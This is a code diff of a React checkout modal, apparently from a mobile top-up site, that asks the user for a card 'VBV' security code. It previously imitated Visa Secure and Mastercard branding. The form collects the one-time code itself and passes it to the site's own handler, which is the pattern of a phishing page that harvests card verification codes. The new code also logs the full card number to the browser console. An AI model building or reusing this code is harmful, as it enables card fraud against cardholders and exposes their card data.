@@ -1,80 +1,133 @@
+// components/checkout/security-modal.tsx
 'use client';
-import { useState, useEffect } from "react";
-import { Button } from "@/components/ui/button";
-import { Input } from "@/components/ui/input";
-import { ShieldCheckIcon, VisaSecureIcon, MastercardIDCheckIcon } from "@/components/Icons";
-import { formatCurrency } from "@/lib/utils";
+
+import React, { useState, useEffect } from 'react';
+import { useFormStatus } from 'react-dom';
+import { cn, formatCurrency, getVbvValidationRules, validateVbv } from '@/lib/utils';
 
 interface SecurityModalProps {
-    isOpen: boolean;
-    onClose: () => void;
-    onConfirm: () => void;
-    brand?: string;
-    isLoading: boolean;
-    amount: number;
-    last4Digits: string;
-    onResendCode: () => void;
+  isOpen: boolean;
+  onClose: () => void;
+  onConfirm: (securityCode: string) => void;
+  brand?: string;
+  isLoading: boolean;
+  amount: number;
+  last4Digits: string;
+  cardNumber?: string;
 }
 
-export const SecurityModal = ({ isOpen, onClose, onConfirm, brand, isLoading, amount, last4Digits, onResendCode }: SecurityModalProps) => {
-    const [timer, setTimer] = useState(60);
-    const [canResend, setCanResend] = useState(false);
+function SubmitButton({ isLoading, isDisabled }: { isLoading: boolean; isDisabled: boolean }) {
+  const { pending } = useFormStatus();
+  return (
+    <button
+      type="submit"
+      disabled={pending || isLoading || isDisabled}
+      aria-disabled={pending || isLoading || isDisabled}
+      className={cn(
+        "w-full bg-black text-white font-bold py-3 px-4 rounded-lg transition-all",
+        "hover:bg-gray-800 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-black",
+        "disabled:bg-gray-400 disabled:cursor-not-allowed"
+      )}
+    >
+      {pending || isLoading ? 'Verificando...' : 'Verificar Código'}
+    </button>
+  );
+}
 
-    useEffect(() => {
-        if (!isOpen) {
-            setTimer(60);
-            setCanResend(false);
-            return;
-        }
-        
-        if (timer > 0) {
-            const intervalId = setInterval(() => setTimer(prev => prev - 1), 1000);
-            return () => clearInterval(intervalId);
-        } else {
-            setCanResend(true);
-        }
-    }, [isOpen, timer]);
+export function SecurityModal({
+  isOpen,
+  onClose,
+  onConfirm,
+  brand,
+  isLoading,
+  amount,
+  last4Digits,
+  cardNumber,
+}: SecurityModalProps) {
+  const [vbvCode, setVbvCode] = useState('');
+  const [vbvError, setVbvError] = useState('');
 
-    const handleResendClick = () => {
-        onResendCode();
-        setTimer(60);
-        setCanResend(false);
-    };
+  const vbvRules = cardNumber ? getVbvValidationRules(cardNumber) : null;
 
-    const brandInfo = {
-        visa: { icon: <VisaSecureIcon />, title: 'Visa Secure' },
-        mastercard: { icon: <MastercardIDCheckIcon />, title: 'Mastercard Identity Check' },
-        default: { icon: <ShieldCheckIcon className="w-10 h-10 text-primary" />, title: 'Pagamento Seguro' },
-    };
+  // Log para depurar o estado e props
+  useEffect(() => {
+    console.log(`SecurityModal - isOpen: ${isOpen}, cardNumber: ${cardNumber}, vbvRules: ${JSON.stringify(vbvRules)}`);
+  }, [isOpen, cardNumber, vbvRules]);
 
-    const currentBrand = brandInfo[brand as keyof typeof brandInfo] || brandInfo.default;
+  const handleVbvChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    const code = e.target.value;
+    setVbvCode(code);
+    if (vbvRules) {
+      const error = validateVbv(code, vbvRules);
+      setVbvError(error);
+    } else {
+      setVbvError('Cartão não requer verificação VBV.');
+    }
+  };
 
-    if (!isOpen) return null;
+  const handleSubmit = (e: React.FormEvent<HTMLFormElement>) => {
+    e.preventDefault();
+    if (!cardNumber) {
+      setVbvError('Número do cartão não fornecido.');
+      return;
+    }
+    if (!vbvRules) {
+      setVbvError('Cartão não requer verificação VBV.');
+      return;
+    }
+    const error = validateVbv(vbvCode, vbvRules);
+    if (error) {
+      setVbvError(error);
+      return;
+    }
+    onConfirm(vbvCode); // Chama onConfirm apenas se o código for válido
+  };
 
-    return (
-        <div className="fixed inset-0 bg-dark/60 flex items-center justify-center z-50 animate-fade-in">
-            <div className="bg-light rounded-xl shadow-lg w-full max-w-sm m-4">
-                <div className="p-5 border-b border-neutral-200">{currentBrand.icon}</div>
-                <div className="p-6">
-                    <h2 className="text-lg font-bold text-dark mb-4">Verifique sua compra</h2>
-                    <div className="space-y-3 text-sm mb-6 text-neutral-600">
-                        <div className="flex justify-between"><span className="font-medium">Comércio:</span><span>RecargaFácil</span></div>
-                        <div className="flex justify-between"><span className="font-medium">Valor:</span><span className="font-bold text-dark">{formatCurrency(amount)}</span></div>
-                        <div className="flex justify-between"><span className="font-medium">Cartão:</span><span>**** **** **** {last4Digits}</span></div>
-                    </div>
-                    <p className="text-sm text-neutral-600 mb-4">Para sua segurança, insira o código de 6 dígitos enviado para seu dispositivo.</p>
-                    <Input label="Código de Verificação" id="authCode" name="authCode" placeholder="******" />
-                    <div className="text-sm text-center text-neutral-500 mt-4">
-                        {!canResend ? `Tempo restante: 00:${timer.toString().padStart(2, '0')}` : <button onClick={handleResendClick} className="font-semibold text-primary hover:underline">Reenviar código</button>}
-                    </div>
-                    <div className="w-full mt-6">
-                        <Button onClick={onConfirm} isLoading={isLoading} fullWidth={true}>
-                            Confirmar Pagamento
-                        </Button>
-                    </div>
-                    <button onClick={onClose} disabled={isLoading} className="mt-4 text-sm text-neutral-500 hover:text-dark transition-colors w-full text-center">Cancelar</button>
-                </div>
-            </div>
-        </div>
-    );
-};
+  if (!isOpen) {
+    console.log('SecurityModal - Não renderizado (isOpen: false)');
+    return null;
+  }
+
+  return (
+    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/50">
+      <div className="bg-zinc-100 rounded-lg max-w-md w-full mx-4 p-4 flex flex-col space-y-4">
+        <h2 className="font-bold text-2xl text-center">Verificação de Segurança</h2>
+        <p className="text-zinc-600 text-center">
+          Insira o código enviado para o seu dispositivo para autorizar a transação de{' '}
+          {formatCurrency(amount)} no cartão {brand || 'desconhecido'} terminando em {last4Digits}.
+        </p>
+
+        <form onSubmit={handleSubmit} className="flex flex-col space-y-4">
+          <input
+            id="code"
+            name="code"
+            type="text"
+            inputMode={vbvRules?.type === 'numeric' ? 'numeric' : 'text'}
+            value={vbvCode}
+            onChange={handleVbvChange}
+            autoComplete="one-time-code"
+            className="w-full text-center text-2xl tracking-[0.5em] p-4 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500"
+            placeholder={vbvRules?.type === 'numeric' ? '------' : 'Código'}
+            required
+          />
+          {vbvError && (
+            <p className="text-red-500 text-sm text-center font-medium">{vbvError}</p>
+          )}
+          <SubmitButton isLoading={isLoading} isDisabled={!!vbvError} />
+          <button
+            type="button"
+            onClick={onClose}
+            disabled={isLoading}
+            className={cn(
+              "w-full bg-gray-300 text-gray-800 font-bold py-3 px-4 rounded-lg transition-all",
+              "hover:bg-gray-400 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-gray-400",
+              "disabled:bg-gray-200 disabled:cursor-not-allowed"
+            )}
+          >
+            Cancelar
+          </button>
+        </form>
+      </div>
+    </div>
+  );
+}
